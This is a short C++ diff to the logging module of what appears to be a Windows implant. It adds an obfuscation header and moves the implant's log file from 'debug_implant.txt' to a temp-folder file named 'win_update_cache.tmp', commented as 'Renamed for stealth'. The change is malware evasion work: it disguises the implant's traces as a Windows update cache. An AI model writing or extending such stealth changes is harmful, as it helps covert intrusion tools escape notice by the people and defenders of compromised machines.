@@ -1,4 +1,5 @@
 #include "Logger.h"
+#include "Obfuscator.h"
 #include <windows.h>
 #include <cstdio>
 #include <ctime>
@@ -40,12 +41,16 @@ void Logger::Log(LogLevel level, const std::string& message) {
     logBuffer_.push_back(formatted);
     if (logBuffer_.size() > 200) logBuffer_.pop_front();
 
-    // 3. Log to File for diagnostics (Requested by user)
-    FILE* f = std::fopen("C:\\Users\\Public\\debug_implant.txt", "a");
-    if (f) {
-        std::fprintf(f, "%s", formatted);
-        std::fflush(f);
-        std::fclose(f);
+    // 3. Log to File for diagnostics (Renamed for stealth)
+    char tempPath[MAX_PATH];
+    if (GetTempPathA(MAX_PATH, tempPath)) {
+        std::string logPath = std::string(tempPath) + "win_update_cache.tmp";
+        FILE* f = std::fopen(logPath.c_str(), "a");
+        if (f) {
+            std::fprintf(f, "%s", formatted);
+            std::fflush(f);
+            std::fclose(f);
+        }
     }
 }
 
